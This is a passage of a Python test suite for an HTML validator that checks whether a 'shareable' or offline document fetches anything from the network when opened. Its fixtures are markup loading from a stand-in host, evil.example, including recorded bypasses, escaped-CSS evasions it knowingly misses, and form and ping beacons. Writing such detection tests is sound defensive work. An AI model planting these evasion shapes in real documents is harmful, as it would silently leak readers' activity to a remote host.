        self.assertTrue(any("nested <style> block with a network url(" in e for e in errors),
                        errors)
        self.assertTrue(any("nested <style> block with a network image-set(" in e for e in errors),
                         errors)

    # The round-2 panel's measured BYPASS (4 of 8 ducks): a candidate that merely CONTAINS the text
    # `url(` is not a `url()` function, and reading the args as one string let it swallow every
    # candidate after it - so a 2x-DPR browser fetched from a file the gate had stamped. Each
    # candidate is now read on its own, anchored at its own start.
    def test_a_quoted_candidate_containing_url_does_not_hide_a_later_remote_candidate(self):
        for value in ('image-set("url(local.png" 1x, "//evil.example/x.png" 2x)',
                      'image-set("x.png?q=url(" 1x, "https://evil.example/x.png" 2x)',
                      'image-set("asset-url(foo" 1x, "https://evil.example/x.png" 2x)',
                      'image-set(url(local.png) 1x, "//evil.example/x.png" 2x)'):
            with self.subTest(value=value):
                markup = "<style>.a { background-image: %s; }</style>" % value
                errors, _ = self._errs_warns(build(body=self._body(MAIN, markup)))
                self.assertTrue(any("style block contains a network image-set(" in e
                                    for e in errors), (value, errors))
                inline = '<div style=\'background-image: %s\'>f</div>' % value
                errors, _ = self._errs_warns(build(body=self._body(MAIN, inline)))
                self.assertTrue(any("inline style on <div> contains a network image-set(" in e
                                    for e in errors), (value, errors))

    # The other direction the round-2 panel measured: a candidate is read ANCHORED at its own start,
    # so a `data:` payload that merely CONTAINS a URL further in is not egress. Every inline SVG
    # data URI carries `xmlns="http://www.w3.org/2000/svg"`, so an unanchored search rejected a
    # document with no egress at all - the false positive this gate can least afford.
    def test_a_url_inside_a_data_candidate_is_not_egress(self):
        for value in ("image-set(\"data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'>"
                      "</svg>\" 1x)",
                      'image-set(url("a), //evil.example/x.png") 1x)',
                      "image-set('data:text/plain,see https://example.com/docs' 1x)",
                      # An UNQUOTED `url(` whose contents carry whitespace is a bad-url-token: the
                      # whole declaration is a parse error and a browser drops it, so the candidate
                      # after it is never selected and reporting one would reject a non-fetch.
                      'image-set(url(local.png 1x, "//evil.example/x.png" 2x)'):
            with self.subTest(value=value):
                markup = "<style>.a { background-image: %s; }</style>" % value
                errors, _ = self._errs_warns(build(body=self._body(MAIN, markup)))
                self.assertEqual([e for e in errors if "image-set(" in e], [], (value, errors))

    # An unescaped LF, CR or FF inside a CSS string makes a BAD-STRING token: the browser drops that
    # declaration and recovers at the `}`, so a LATER rule still applies and still fetches. Reading
    # the string on past the newline let the broken declaration swallow that later rule, and the
    # remote candidate in it went unreported (raised by the Copilot reviewer on this PR).
    def test_a_bad_string_token_does_not_swallow_a_later_remote_candidate(self):
        markup = ('<style>.a { background-image: image-set("broken\n'
                  "} .b { background-image: image-set('//evil.example/x.png' 1x) }</style>")
        errors, _ = self._errs_warns(build(body=self._body(MAIN, markup)))
        self.assertTrue(any("style block contains a network image-set(" in e for e in errors),
                        errors)


    # `image-set()` takes a `<string>`, and `var()` substitution happens on the token stream BEFORE
    # the property grammar is read, so `image-set(var(--u) 1x)` with `--u: "https://..."` really
    # does fetch - unlike `url(var(--x))`, which no browser supports because `url(` is a url-token
    # rather than a function. Reading it needs custom-property resolution, and failing CLOSED on a
    # bare `var(` would reject `image-set(var(--logo) 1x)` whose variable holds a local path -
    # deleting an author's value over a reference that loads nothing. The CSS-ESCAPE and
    # comment-as-whitespace spellings are the shared literal-pattern gap #1029 tracks, and closing
    # them means moving the exporter's strip in the same change.
    def test_the_recorded_shareable_css_residuals_are_knowingly_not_read(self):
        for markup in (
                "<style>:root { --u: \"https://evil.example/x.png\"; }\n"
                ".a { background-image: image-set(var(--u) 1x); }</style>",
                "<style>.a { background: u\\72 l(https://evil.example/x.png); }</style>",
                '<style>@im\\70 ort "https://evil.example/t.css";</style>',
                "<style>@import/**/\"https://evil.example/t.css\";</style>"):
            with self.subTest(markup=markup):
                errors, _ = self._errs_warns(build(body=self._body(MAIN, markup)))
                self.assertEqual([e for e in errors if "image-set(" in e or "url(" in e
                                  or "@import" in e], [], (markup, errors))

    # The control that makes the widening safe: a relative or `data:` reference resolves inside the
    # file and reaches no network, so none of the newly covered shapes may start rejecting a
    # document that has no egress at all.
    def test_shareable_mode_accepts_local_and_data_media_references(self):
        css = CSS_REGION.replace(
            ":root { --cp-bg: #ffffff; --cp-text: #000000; }",
            '@import "local-theme.css";\n'
            ":root { --cp-bg: #ffffff; --cp-text: #000000; "
            "background-image: url(data:image/gif;base64,R0lGODlhAQABAAAAACw=); }")
        main = MAIN.replace("<p>content</p>",
                            '<p style="background: url(local-tile.png)">content</p>')
        extras = [
            '<video src="local-clip.mp4" poster="local-poster.png">'
            '<source src="local-clip.webm"><track src="local-captions.vtt"></video>',
            '<audio src="data:audio/mpeg;base64,AAAA"></audio>',
            '<picture><source srcset="local-1x.png 1x, data:image/gif;base64,R0lGODlhAQABAAAAACw= 2x">'
            '<img src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" alt="x"></picture>',
            '<object data="local.pdf"></object>',
            '<embed src="local.svg">',
            '<div background="local-bg.png"></div>',
            '<table><tr background="local-bg.png"><td background="local-bg.png"></td></tr></table>',
            '<svg><image href="local-a.png"/><image xlink:href="local-b.png"/>'
            '<use href="#local-symbol"/><use xlink:href="#local-symbol"/>'
            '<filter id="f1"><feImage href="local-c.png"/></filter>'
            '<filter id="f2"><feImage xlink:href="data:image/gif;base64,R0lGODlhAQABAAAAACw="/>'
            "</filter></svg>",
            # An `<input>` fetches only for `type="image"`, so a network `src` on any other type is
            # inert and must not be reported - the gate must read the TYPE, not just the attribute.
            '<input type="text" src="https://evil.example/x.png">',
            '<input type="image" src="local-button.png">',
        ]
        errors, warnings = self._errs_warns(build(css=css, body=self._body(main, *extras)))
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    # `<image src>` is an `<img>` to a browser and really fetches: HTML tree construction renames an
    # `<image>` start tag to `img` and reprocesses it with its attributes, so the element that ends up
    # in the DOM is an `HTMLImageElement` that loads on open. This gate reads the LITERAL tokenized
    # tag name, and `_MEDIA_LOAD_ATTRS` carried `image` only for the SVG `href`/`xlink:href` pair, so
    # the load was invisible - a complete INVERSION, since `<image href="https://...">` (which in HTML
    # content loads nothing) WAS reported while `<image src=...>` was not, in offline mode as well as
    # shareable (#1165). Widening the gate alone would have been the CMH-OFFLINE-04 drift, so it moved
    # WITH the exporter strip: `49-offline-export.spec.js` pins that `all("image")` now clears the same
    # two attributes, so the gate cannot reject a file the export just produced.
    def test_an_image_element_that_fetches_through_src_is_an_error_in_both_modes(self):
        for markup, needle in (
                ('<image src="https://evil.example/x.png">', '<image src'),
                ('<image srcset="https://evil.example/x.png 1x">', '<image srcset'),
                # Only a CANDIDATE-LIST read finds this one: the whole attribute value does not start
                # with a scheme, so a single-URL reading of `srcset` would see nothing network at all.
                # That is what pins the `True` in the pair, rather than merely riding on the fact that
                # a lone `https://...` value matches either way.
                ('<image srcset="local.png 1x, https://evil.example/x.png 2x">', '<image srcset'),
                ('<svg><image src="https://evil.example/x.png"/></svg>', '<image src'),
                ('<image src="//evil.example/x.png">', '<image src')):
            for offline in (False, True):
                with self.subTest(markup=markup, offline=offline):
                    doc = build(body=self._body(MAIN, markup))
                    if offline:
                        doc = with_offline_mode(doc)
                    errors, _ = self._errs_warns(doc)
                    clause = "offline mode" if offline else "self-contained guarantee"
                    self.assertTrue(any(clause in e and needle in e for e in errors),
                                    (markup, offline, errors))

    # The control that keeps the widening from becoming a false rejection: a relative or `data:`
    # reference resolves inside the file and reaches no network, in either spelling and either mode.
    # The `data:` candidate carries a COMMA of its own, which a comma-splitting `srcset` reading would
    # cut in half and then report as egress (the #1084 false rejection), so it pins the candidate
    # boundary from the clean side the way the error case above pins it from the reported side.
    def test_a_relative_or_data_image_src_stays_clean(self):
        markup = ('<image src="local-a.png">'
                  '<image srcset="local-1x.png 1x, data:image/gif;base64,R0lGODlhAQABAAAAACw= 2x">'
                  '<image srcset="data:text/plain,https://example.invalid/not-a-load 1x">'
                  '<svg><image src="data:image/gif;base64,R0lGODlhAQABAAAAACw="/></svg>')
        for offline in (False, True):
            with self.subTest(offline=offline):
                doc = build(body=self._body(MAIN, markup))
                if offline:
                    doc = with_offline_mode(doc)
                errors, warnings = self._errs_warns(doc)
                self.assertEqual(errors, [], (offline, errors))
                # No WARNING either, deliberately: the local-path "run tools/inline_images.py"
                # advisory is keyed on `img` `src` and always has been - `img` `srcset`, an
                # `<input type="image" src>` and every other local reference draw nothing either -
                # so `<image src="local-a.png">` is not a carve-out from a general local-path rule,
                # it is that rule's existing scope. Recorded on CMH-VAL-08 so a later "consistency
                # fix" does not read this silence as an omission.
                self.assertEqual(warnings, [], (offline, warnings))

    # The scope DECISION, pinned as a test so it cannot drift into a silent widening: the guarantee
    # covers what a browser reaches the network for when a reader merely OPENS the file. Egress that
    # needs a CLICK is deliberately out of scope in shareable mode - the top-level rules already
    # exempt `<a href>` for exactly that reason - and stays offline-only. A `meta refresh` is NOT in
    # this group (it fires with no user action); its own test is below.
    def test_shareable_mode_leaves_user_initiated_egress_alone(self):
        for markup in ('<form action="https://evil.example/collect"><button>go</button></form>',
                       '<form><button formaction="https://evil.example/collect">go</button></form>',
                       '<a href="#s" ping="https://evil.example/audit">x</a>',
                       '<a href="https://evil.example/away">x</a>'):
            with self.subTest(markup=markup):
                errors, warnings = self._errs_warns(build(body=self._body(MAIN, markup)))
                self.assertEqual(errors, [], (markup, errors))
                self.assertEqual(warnings, [], (markup, warnings))

    # The correction the review panel made to the first cut of the scope rule (#1145): a meta
    # refresh was filed with `<a href>` / `form` / `ping` as "navigation", but those three need a
    # CLICK and `content="0;url=https://..."` fires the instant the document is parsed. So a
    # stamped shareable file carrying one really does reach the network on open - the one thing the
    # stamp tells a recipient will not happen - and it is an error like any other automatic load.
    def test_shareable_mode_rejects_a_meta_refresh_to_a_network_url(self):
        for content in ("0;url=https://evil.example/", "0; url=https://evil.example/",
                        "5;https://evil.example/", "0;url=//evil.example/",
                        "0;url=https:evil.example/"):
            with self.subTest(content=content):
                markup = '<meta http-equiv="refresh" content="%s">' % content
                errors, _ = self._errs_warns(build(body=self._body(MAIN, markup)))
                self.assertTrue(any("self-contained guarantee" in e and "refresh" in e
                                    and "no user action" in e for e in errors), (content, errors))

    # The control: a refresh that reaches no network is left alone in shareable mode. Offline is
    # stricter and rejects EVERY refresh for export-strip parity, which this must not copy - a
    # relative refresh is legitimate content in a file that makes no zero-network promise.
    def test_shareable_mode_accepts_a_local_meta_refresh(self):
        for content in ("0;url=#top", "5;url=./other.html", "30", "0;url=data:text/html,x"):
            with self.subTest(content=content):
                markup = '<meta http-equiv="refresh" content="%s">' % content
                errors, warnings = self._errs_warns(build(body=self._body(MAIN, markup)))
                self.assertEqual(errors, [], (content, errors))
                self.assertEqual(warnings, [], (content, warnings))

    # Offline keeps its own unconditional rule, and the two must never double-report one refresh.
    def test_an_offline_meta_refresh_is_reported_once_by_the_offline_rule(self):
        markup = '<meta http-equiv="refresh" content="0;url=https://evil.example/">'
        errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, markup))))
        refresh = [e for e in errors if "refresh" in e]
        self.assertEqual(refresh, ["offline mode: meta refresh points at a network URL - remove it"],
                         errors)

    # A speculative hint needs no rule of its own here, and this pins why: `preconnect` and
    # `dns-prefetch` are already in `FETCHING_LINK_RELS`, so a NETWORK href on one is already the
    # ordinary shareable `link` warning. The offline-only extra is the PRESENCE rule (#1076), and a
    # relative hint reaches no network at all, so it is moot for the self-contained question. Both
    # rels are checked against both href classes, so one token dropping out of the set is caught.
    def test_a_speculative_hint_is_already_covered_by_the_shareable_link_rule(self):
        for rel in ("preconnect", "dns-prefetch"):
            with self.subTest(rel=rel, href="network"):
                errors, warnings = self._errs_warns(build(body=self._body(
                    MAIN, '<link rel="%s" href="https://evil.example">' % rel)))
                self.assertEqual(errors, [], errors)
                self.assertTrue(any("self-contained guarantee" in w and "evil.example" in w
                                    for w in warnings), (rel, warnings))
            with self.subTest(rel=rel, href="local"):
                errors, warnings = self._errs_warns(build(body=self._body(
                    MAIN, '<link rel="%s" href="local-hint.html">' % rel)))
                self.assertEqual(errors, [], (rel, errors))
                self.assertEqual(warnings, [], (rel, warnings))

    # A network `background` on a `<link>` must stay an ERROR: the shareable `link` rule reports a
    # network `href` as a WARNING, and the severity routing keys on the TAG, so a finding from the
    # universal `background` read would have been downgraded to a warning without an attribute test.
    def test_a_background_on_a_link_is_an_error_not_the_link_warning(self):
        for markup in ('<link background="https://evil.example/bg.png">',
                       '<iframe srcdoc="&lt;link background=&quot;https://evil.example/bg.png'
                       '&quot;&gt;"></iframe>'):
            with self.subTest(markup=markup):
                errors, warnings = self._errs_warns(build(body=self._body(MAIN, markup)))
                self.assertTrue(any("background" in e and "evil.example" in e for e in errors),
                                (markup, errors))
                # The `srcdoc` content-loss ADVISORY echoes the nested markup, so it names the
                # attribute too; it is not a severity ruling and is excluded here.
                blocking = [w for w in warnings
                            if not w.startswith(validate.SRCDOC_ADVISORY_PREFIX)]
                self.assertFalse(any("background" in w and "evil.example" in w for w in blocking),
                                 (markup, blocking))

    # A speculation ruleset reaches the network by ITSELF, with no user action and no code running,
    # so it is in scope for the shareable guarantee (the review panel measured a stamped shareable
    # file carrying one). Rejected whatever the ruleset says: a `"source": "document"` ruleset names
    # no URL and turns the document's own exempt `<a href>` links into automatic fetches.
    def test_shareable_mode_rejects_a_speculation_ruleset(self):
        for body in ('{"prerender": [{"urls": ["https://evil.example/"]}]}',
                     '{"prefetch": [{"source": "document"}]}',
                     '{"prefetch": [{"urls": ["./local.html"]}]}'):
            with self.subTest(body=body):
                markup = '<script type="speculationrules">%s</script>' % body
                errors, _ = self._errs_warns(build(body=self._body(MAIN, markup)))
                self.assertTrue(any("self-contained guarantee" in e and "speculationrules" in e
                                    for e in errors), (body, errors))

    # An import map fetches nothing on its own - it only re-points where a bare module specifier
    # resolves - so it must NOT be reported in shareable mode. Offline keeps its stricter rule for
    # export-strip parity, and this is the control that the shareable rule did not copy it.
    def test_shareable_mode_accepts_an_import_map(self):
        markup = ('<script type="importmap">{"imports": {"x": "./local-x.js"}}</script>')
        errors, warnings = self._errs_warns(build(body=self._body(MAIN, markup)))
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    # A nested `<noscript><style>` must be reported exactly ONCE. `_find_fragment_styles` reads a
    # scripting-DISABLED pass, where `<noscript>` holds markup rather than raw text, so the parser
    # never opens a fallback buffer and its `noscript_styles` list stays empty - which is why
    # concatenating both lists cannot double-count. That invariant lives three hundred lines away
    # in `_enter_raw_text`, so it is pinned here rather than left to a reader to rediscover.
    def test_a_nested_noscript_stylesheet_is_reported_once(self):
        nested = ("&lt;noscript&gt;&lt;style&gt;@import "
                  "&quot;https://evil.example/t.css&quot;;&lt;/style&gt;&lt;/noscript&gt;")
        markup = '<iframe srcdoc="%s"></iframe>' % nested
        errors, _ = self._errs_warns(build(body=self._body(MAIN, markup)))
        hits = [e for e in errors if "carries a nested @import" in e]
        self.assertEqual(len(hits), 1, errors)

    # The fail-closed half of the nested style read: an empty answer from a parse that BLEW UP must
    # mean "could not look", never "this frame carries no stylesheet". Only a RAISED parse can set
    # it (a fallback pass cannot set the parser's own `failed` flag), so the raise is forced here.
    def test_a_nested_stylesheet_parse_that_blows_up_fails_closed(self):
        from checks import parsing as _parsing
        markup = ('<iframe srcdoc="&lt;style&gt;body{color:red}&lt;/style&gt;"></iframe>')
        doc = build(body=self._body(MAIN, markup))
        real = _parsing._TagAttrParser.parse_document

        def _boom(self, text):
            if getattr(self, "_fallback", False):
                raise RuntimeError("boom")
            return real(self, text)

        _parsing._tag_attr_index.cache_clear()
        self.addCleanup(_parsing._tag_attr_index.cache_clear)
        with mock.patch.object(_parsing._TagAttrParser, "parse_document", _boom):
            errors, _ = self._errs_warns(doc)
        self.assertTrue(any("could not be parsed for the self-contained resource checks" in e
                            for e in errors), errors)

    def test_a_shareable_media_load_fails_strict_and_is_not_stamped(self):
        # End to end, the whole point of the widening: a recipient must not be handed a stamped
        # file that fetches from a host. The `video` measured in #1145 validated STRICT-CLEAN and
        # received the `commentable-html-validated` stamp.
        content = build(body=self._body(MAIN, '<video src="https://evil.example/v.mp4"></video>'))
        with tempfile.TemporaryDirectory() as d:
            p = os.path.join(d, "doc.html")
            with open(p, "w", encoding="utf-8", newline="") as fh:
                fh.write(content)
            r = subprocess.run([sys.executable, VALIDATE_PY, "--strict", p],
                               capture_output=True, text=True)
            self.assertNotEqual(r.returncode, 0, r.stdout + r.stderr)
            self.assertIn("evil.example", r.stdout)
            with open(p, "r", encoding="utf-8", newline="") as fh:
                stamped = fh.read()
        self.assertNotIn('name="commentable-html-validated"', stamped,
                         "a network media load must withhold the validated stamp")

    # CMH-VAL-25 inherits the widening: the nested read mirrors the top-level set element for
    # element, so every shape added above is reported inside an `<iframe srcdoc>` too.
    def test_a_nested_media_load_inside_a_srcdoc_is_an_error(self):
        for nested, clause in (
                ("&lt;video src=&quot;https://evil.example/v.mp4&quot;&gt;&lt;/video&gt;",
                 'carries a nested <video src="https://evil.example/v.mp4">'),
                ("&lt;object data=&quot;https://evil.example/x.swf&quot;&gt;&lt;/object&gt;",
                 'carries a nested <object data="https://evil.example/x.swf">'),
                ("&lt;embed src=&quot;https://evil.example/x.swf&quot;&gt;",
                 'carries a nested <embed src="https://evil.example/x.swf">'),
                ("&lt;input type=image src=&quot;https://evil.example/x.png&quot;&gt;",
                 'carries a nested <input src="https://evil.example/x.png">'),
                ("&lt;div background=&quot;https://evil.example/bg.png&quot;&gt;&lt;/div&gt;",
                 'carries a nested <div background="https://evil.example/bg.png">'),
                ("&lt;svg&gt;&lt;use href=&quot;https://evil.example/x.svg#i&quot;/&gt;&lt;/svg&gt;",
                 'carries a nested <use href="https://evil.example/x.svg#i">'),
                ("&lt;video poster=&quot;https://evil.example/p.png&quot;&gt;&lt;/video&gt;",
                 'carries a nested <video poster="https://evil.example/p.png">'),
                ("&lt;audio src=&quot;https://evil.example/a.mp3&quot;&gt;&lt;/audio&gt;",
                 'carries a nested <audio src="https://evil.example/a.mp3">'),
                ("&lt;source src=&quot;https://evil.example/v.webm&quot;&gt;",
                 'carries a nested <source src="https://evil.example/v.webm">'),
                ("&lt;track src=&quot;https://evil.example/c.vtt&quot;&gt;",
                 'carries a nested <track src="https://evil.example/c.vtt">'),
                ("&lt;svg&gt;&lt;image href=&quot;https://evil.example/x.png&quot;/&gt;&lt;/svg&gt;",
                 'carries a nested <image href="https://evil.example/x.png">'),
                ("&lt;svg&gt;&lt;image xlink:href=&quot;https://evil.example/x.png&quot;/&gt;"
                 "&lt;/svg&gt;",
                 'carries a nested <image xlink:href="https://evil.example/x.png">'),
                ("&lt;svg&gt;&lt;use xlink:href=&quot;https://evil.example/x.svg#i&quot;/&gt;"
                 "&lt;/svg&gt;",
                 'carries a nested <use xlink:href="https://evil.example/x.svg#i">'),
                ("&lt;svg&gt;&lt;feImage href=&quot;https://evil.example/x.png&quot;/&gt;&lt;/svg&gt;",
                 'carries a nested <feimage href="https://evil.example/x.png">'),
                ("&lt;svg&gt;&lt;feImage xlink:href=&quot;https://evil.example/x.png&quot;/&gt;"
                 "&lt;/svg&gt;",
                 'carries a nested <feimage xlink:href="https://evil.example/x.png">'),
                ("&lt;source srcset=&quot;https://evil.example/x.png 1x&quot;&gt;",
                 'carries a nested <source srcset="https://evil.example/x.png">'),
                # `<image src>`/`<image srcset>` (#1165): a browser renames the start tag to `img`
                # and fetches, and the nested read inherits the widening through `_MEDIA_LOAD_ATTRS`.
                ("&lt;image src=&quot;https://evil.example/x.png&quot;&gt;",
                 'carries a nested <image src="https://evil.example/x.png">'),
                ("&lt;image srcset=&quot;https://evil.example/x.png 1x&quot;&gt;",
                 'carries a nested <image srcset="https://evil.example/x.png">'),
                ('&lt;p style=&quot;background: url(https://evil.example/bg.png)&quot;&gt;&lt;/p&gt;',
                 'carries a nested inline style on <p> that contains a network url('),
                ("&lt;style&gt;@import &quot;https://evil.example/t.css&quot;;&lt;/style&gt;",
                 'carries a nested @import "https://evil.example/t.css"'),
                ("&lt;style&gt;body{background:url(https://evil.example/bg.png)}&lt;/style&gt;",
                 "carries a nested <style> block with a network url("),
                ("&lt;meta http-equiv=refresh content=&quot;0;url=https://evil.example/&quot;&gt;",
                 "carries a nested meta refresh to a network URL"),
                ("&lt;script type=speculationrules&gt;{&quot;prefetch&quot;:[{&quot;source&quot;:"
                 "&quot;document&quot;}]}&lt;/script&gt;",
                 'carries a nested <script type="speculationrules">')):
            markup = '<iframe srcdoc="%s"></iframe>' % nested
            with self.subTest(nested=nested):
                errors, _ = self._errs_warns(build(body=self._body(MAIN, markup)))
                self.assertTrue(any(clause in e for e in errors),
                                "expected %r in a nested error for %r, got %r"
                                % (clause, nested, errors))

    # The offline half of the moved checks, pinned EXACTLY rather than by substring, because the
    # spec and changelog both claim an offline report's wording did not change when these checks
    # left the `offline_mode` branch. A count assertion rides along: an `any()` match would stay
    # green if a moved check ever ran twice, which is the other way the move could have gone wrong.
    def test_the_moved_checks_report_offline_exactly_once_with_unchanged_wording(self):
        css = CSS_REGION.replace(
            ":root { --cp-bg: #ffffff; --cp-text: #000000; }",
            '@import "https://evil.example/theme.css";\n'
            ":root { --cp-bg: #ffffff; --cp-text: #000000; "
            "background-image: url(https://evil.example/bg.png); }")
        main = MAIN.replace("<p>content</p>",
                            '<p style="background: url(//evil.example/inline.png)">content</p>')
        extras = ['<video src="https://evil.example/v.mp4"></video>',
                  '<div background="https://evil.example/bg.png"></div>',
                  '<table><tr background="https://evil.example/row.png"></tr></table>']
        errors, _ = self._errs_warns(
            with_offline_mode(build(css=css, body=self._body(main, *extras))))
        for expected in (
                'offline mode: <video src="https://evil.example/v.mp4"> loads over the network - '
                "inline or remove it",
                'offline mode: <div background="https://evil.example/bg.png"> loads over the '
                "network - inline or remove it",
                # A table PART, which the old hand-maintained tag list did NOT cover: this is the
                # one place the universal attribute read ADDS an offline finding, and it must be
                # asserted rather than left to the prose.
                'offline mode: <tr background="https://evil.example/row.png"> loads over the '
                "network - inline or remove it",
                'offline mode: @import "https://evil.example/theme.css" loads over the network - '
                "inline or remove it",
                "offline mode: style block contains a network url(...) - inline or remove it",
                "offline mode: inline style on <p> contains a network url(...) - inline or "
                "remove it"):
            self.assertEqual(errors.count(expected), 1,
                             "expected %r exactly once, got %r" % (expected, errors))

    def test_external_stylesheet_link_warns(self):
        link = '<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=X">'
        errors, warnings = self._errs_warns(build(body=self._body(MAIN, link)))
        self.assertEqual(errors, [], errors)
        self.assertTrue(any("self-contained guarantee" in w for w in warnings), warnings)

    # -- duplicate heading ids --------------------------------------------- #
    def test_duplicate_heading_ids_warn(self):
        main = ('<main id="commentRoot" data-cmh-content-root data-comment-key="k" data-doc-label="l" data-doc-source="s">\n'
                '  <h2 id="dup">A</h2>\n  <p>x</p>\n  <h2 id="dup">B</h2>\n</main>')
        errors, warnings = self._errs_warns(build(body=self._body(main)))
        self.assertEqual(errors, [], errors)
        self.assertTrue(any("duplicate heading id" in w for w in warnings), warnings)

    # -- embeddedComments per-item schema ---------------------------------- #
    def _embedded(self, payload):
        return ("<!--\nBEGIN: commentable-html - EMBEDDED COMMENTS\n-->\n"
                '<script type="application/json" id="embeddedComments">' + payload + "</script>\n"
                "<!-- END: commentable-html - EMBEDDED COMMENTS -->")

    def test_embedded_comment_item_bad_id_errors(self):
        body = [HANDLED_REGION, self._embedded('[{"id": null, "note": "x"}]'), comment_ui(), MAIN, JS_REGION]
        errors, _ = self._errs_warns(build(body=body))
        self.assertTrue(any("missing or unsafe id" in e for e in errors), errors)

    def test_embedded_comment_item_valid_id_is_clean(self):
        body = [HANDLED_REGION, self._embedded('[{"id": "cabc123", "note": "hi"}]'), comment_ui(), MAIN, JS_REGION]
        errors, warnings = self._errs_warns(build(body=body))
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    # -- canvas aria: report ALL offenders in one pass --------------------- #
    def test_multiple_canvases_missing_aria_reported_together(self):
        main = ('<main id="commentRoot" data-cmh-content-root data-comment-key="k" data-doc-label="l" data-doc-source="s">\n'
                '  <div class="cm-skip"><canvas id="c1"></canvas></div>\n'
                '  <div class="cm-skip"><canvas id="c2"></canvas></div>\n</main>')
        render = '<script>var x = document.getElementById("c1").getContext("2d");</script>'
        errors, warnings = self._errs_warns(build(body=self._body(main, render)))
        self.assertEqual(errors, [], errors)
        self.assertTrue(any("2 of 2 <canvas>" in w for w in warnings), warnings)

    # -- --strict CLI ------------------------------------------------------- #
    def test_strict_flag_fails_on_warnings_only(self):
        main = MAIN.replace("<p>content</p>", '<p>content</p>\n  <img src="images/x.png" alt="x">')
        content = build(body=self._body(main))
        with tempfile.TemporaryDirectory() as d:
            p = os.path.join(d, "doc.html")
            with open(p, "w", encoding="utf-8", newline="") as fh:
                fh.write(content)
            r_plain = subprocess.run([sys.executable, VALIDATE_PY, p], capture_output=True, text=True)
            self.assertEqual(r_plain.returncode, 0, r_plain.stdout + r_plain.stderr)
            self.assertIn("WARNING", r_plain.stdout)
            r_strict = subprocess.run([sys.executable, VALIDATE_PY, "--strict", p], capture_output=True, text=True)
            self.assertEqual(r_strict.returncode, 1, r_strict.stdout + r_strict.stderr)
            self.assertIn("strict", r_strict.stdout.lower())


class OfflineHeadNoscriptTests(unittest.TestCase, ValidateAssertions):
    """CMH-OFFLINE-05: a HEAD `<noscript>` a scripting-disabled parse takes apart.

    The "in head noscript" insertion mode allows only `link`, `style`, `meta`, `basefont`,
    `bgsound`, `noframes`, comments and whitespace; anything else POPS the fallback and reprocesses
    that node - and everything after it - as a head SIBLING. The export re-parses with `DOMParser`
    (scripting off), so that promotion happens inside the parse, and the export ACTIVATES markup a
    reader only ever sees as inert text. The exporter drops such a fallback in a PRE-PARSE pass;
    these hold the gate to the same verdicts, in both directions, so neither side can drift into
    blessing a file the other changes.
    """

    def _head(self, doc, injected):
        return doc.replace("<head>\n", "<head>\n" + injected + "\n", 1)

    def _offline(self, injected):
        return self._head(with_offline_mode(build()), injected)

    PROMOTING = '<noscript><script>window.__probe = 1;</script></noscript>'
    ALLOWED = ('<noscript><!-- a fallback note --><meta name="cmh-fallback" content="1">'
               '<style>.cmh-fallback { color: #333; }</style></noscript>')

    def _head_noscript_errors(self, content):
        errors, _ = _validate_text(content)
        return [e for e in errors if "in head noscript" in e]

    def test_a_head_fallback_the_parse_takes_apart_is_rejected(self):
        self.assertTrue(self._head_noscript_errors(self._offline(self.PROMOTING)))

    def test_a_head_fallback_of_only_allowed_content_is_accepted(self):
        self.assertEqual(self._head_noscript_errors(self._offline(self.ALLOWED)), [])

    def test_the_same_fallback_in_the_body_is_an_ordinary_element(self):
        # With scripting off a BODY `<noscript>` is transparent, so nothing is promoted out of it
        # and the whole rule is head-scoped. Flagging one here would be pure content loss.
        doc = with_offline_mode(build(body=[HANDLED_REGION, EMBEDDED_REGION, comment_ui(),
                                            MAIN, self.PROMOTING, JS_REGION]))
        self.assertEqual(self._head_noscript_errors(doc), [])

    def test_a_shareable_document_is_unaffected(self):
        # Shareable makes no zero-network promise and preserves the author's bytes, so the export
        # never rewrites this and the gate must not reject it either.
        self.assertEqual(self._head_noscript_errors(self._head(build(), self.PROMOTING)), [])

    def test_the_predicate_pops_on_everything_the_mode_does_not_allow(self):
        for body in (
            "<script>window.x = 1</script>",       # the shape that started this
            "enable JavaScript to review this",    # a character token is "anything else" too
            "<p>fallback prose</p>",
            "<template><meta charset='utf-8'></template>",
            "</br>",                               # the one end tag the mode does not ignore
            "<img src='data:image/gif;base64,AA'>",
            "< not a tag",
            "<meta name='x'",                      # a truncated tag: fail closed
            "<style>/* unclosed",                  # raw text running past the fallback's own end
        ):
            with self.subTest(body=body):
                self.assertTrue(resources.offline_head_noscript_promotes(body), body)

    def test_the_predicate_keeps_what_the_mode_allows(self):
        for body in (
            "",
            "   \n\t ",
            "<!-- a fallback note -->",
            "<!DOCTYPE html>",
            '<link rel="stylesheet" href="fallback.css">',
            '<meta name="x" content="y">',
            "<style>.x { color: red }</style>",
            "<noframes>fallback</noframes>",
            "<basefont><bgsound>",
            "</span>",                             # an end tag this mode ignores
            '<html class="no-js">',                # processed with the in-body rules: attributes only
            '<style>p::after { content: "<p>" }</style>',
        ):
            with self.subTest(body=body):
                self.assertFalse(resources.offline_head_noscript_promotes(body), body)

    def test_only_a_head_scoped_fallback_is_reported(self):
        promotions = resources.offline_head_noscript_promotions(
            "<html><head><title>t</title>" + self.PROMOTING + "</head><body>"
            + self.PROMOTING + "</body></html>")
        self.assertEqual(len(promotions), 1, promotions)

    def test_a_templated_fallback_is_not_head_content(self):
        # A `<template>`'s content is parsed in its own fragment and never reaches the "in head
        # noscript" mode, so removing one would be content loss - and the scan must still find a
        # real head fallback that FOLLOWS the template rather than stopping at it.
        promotions = resources.offline_head_noscript_promotions(
            "<html><head><template>" + self.PROMOTING + "</template>"
            + self.PROMOTING + "</head><body>b</body></html>")
        self.assertEqual(len(promotions), 1, promotions)

    def test_a_fallback_after_an_explicit_head_close_is_body_content(self):
        self.assertEqual(resources.offline_head_noscript_promotions(
            "<html><head><title>t</title></head>" + self.PROMOTING + "</html>"), [])

    def test_a_script_body_naming_the_head_end_does_not_end_the_head(self):
        # `</head>` inside a script body is TEXT to a browser, so the head runs on and the fallback
        # after it is head content. A scan that read the raw string would miss it.
        promotions = resources.offline_head_noscript_promotions(
            "<html><head><script>var s = '</head>';</script>" + self.PROMOTING
            + "</head><body>b</body></html>")
        self.assertEqual(len(promotions), 1, promotions)


class OfflineHeadNoscriptParityTests(unittest.TestCase):
